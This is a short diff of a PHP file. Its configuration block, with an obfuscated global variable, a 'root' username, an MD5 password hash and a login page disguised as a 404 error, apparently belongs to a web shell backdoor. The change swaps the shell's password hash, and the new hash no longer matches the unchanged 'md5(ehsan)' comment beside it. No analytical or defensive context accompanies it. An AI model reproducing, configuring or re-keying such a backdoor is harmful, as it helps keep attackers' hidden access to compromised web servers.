@@ -10,7 +10,7 @@ if(function_exists('set_magic_quotes_runtime')){
 }
 $GLOBALS['ayAHGSshXn'] = array(
 'username' => 'root',
-'password' => '7af08a881e3b88e06c9db743a50df1b6',//md5(ehsan)
+'password' => '4cf9299eb1cd60fab378905581aa422b',//md5(ehsan)
 'safe_mode' => '1',
 'login_page' => '404',
 'show_icons' => '',
